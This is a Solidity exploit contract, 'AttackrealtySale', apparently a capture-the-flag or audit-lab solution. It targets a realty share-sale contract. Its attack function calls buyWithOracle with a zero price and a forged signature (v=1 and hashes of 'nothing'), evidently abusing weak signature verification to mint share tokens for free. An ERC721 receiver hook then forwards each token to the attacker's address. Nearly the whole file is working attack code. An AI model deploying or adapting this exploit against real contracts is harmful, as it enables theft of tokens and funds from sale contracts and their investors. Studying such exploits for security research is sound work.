// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/access/Ownable.sol";

struct SharePrice {
    uint256 expires; // Time which the price expires
    uint256 price; // Share Price in ETH
}

struct Signature {
    uint8 v;
    bytes32 r;
    bytes32 s;
}

interface IRealtySale {
    function shareToken() external view returns (address);
    function buyWithOracle(SharePrice calldata sharePrice, Signature calldata signature) external payable;
}

interface IRealtyToken {
    function lastTokenID() external view returns (uint256);
    function maxSupply() external view returns (uint256);
    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract AttackrealtySale is Ownable {
    address private realtyToken;
    address private realtySale;

    constructor(address _saleContractAddress) {
        realtySale = _saleContractAddress;
        realtyToken = IRealtySale(realtySale).shareToken();
    }

    function attack() external onlyOwner {
        // Prepare the SharePrice struct
        SharePrice memory price = SharePrice({expires: block.timestamp + 100000, price: 0});
        // Prepare the Signature struct
        Signature memory signature = Signature({v: 1, r: keccak256("nothing"), s: keccak256("nothing")});

        // Call the buyWithOracle function on the RealtySale contract

        IRealtySale(realtySale).buyWithOracle(price, signature);
    }

    // Implement the ERC721Receiver interface to receive ERC721 tokens
    function onERC721Received(address, address, uint256 _tokenId, bytes calldata) external returns (bytes4) {
        IRealtyToken(realtyToken).transferFrom(address(this), owner(), _tokenId);
        return this.onERC721Received.selector;
    }
}
